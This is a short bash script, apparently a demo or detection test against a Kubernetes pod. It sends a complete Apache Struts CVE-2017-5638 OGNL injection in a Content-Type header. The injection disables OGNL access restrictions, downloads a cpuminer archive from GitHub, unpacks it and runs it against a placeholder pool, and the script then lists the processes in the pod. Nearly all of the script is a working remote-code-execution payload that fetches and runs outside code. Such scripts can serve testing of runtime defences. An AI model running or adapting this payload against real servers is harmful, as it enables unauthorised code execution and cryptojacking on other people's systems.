#!/usr/bin/env bash

set -eu

ENDPOINT="$2"
NS="$1"

POD=$(kubectl get pod -n "$NS" -l app=api-server -o jsonpath="{.items[*].metadata.name}")

echo "Endpoint:  $ENDPOINT"
echo "Pod:       $POD"
echo "Namespace: $NS"

echo
echo "Using Struts to download and run a cryptominer..."
timeout 5 curl -i -v -s -k -X GET -H "User-Agent: curl" -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='sh -c \"wget -O /miner.tgz https://github.com/pooler/cpuminer/releases/download/v2.5.0/pooler-cpuminer-2.5.0-linux-x86_64.tar.gz && tar xzvf /miner.tgz && chmod +x ./minerd && ./minerd --url http://blackhole.local\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" "http://$ENDPOINT/apachestruts-cve20175638.action" || true

echo
echo "Checking processes running..."
echo
echo "Processes running:"
kubectl exec -n "$NS" -it "$POD" -- sh -c "ps -C sh -C ps -N -o pid,comm"
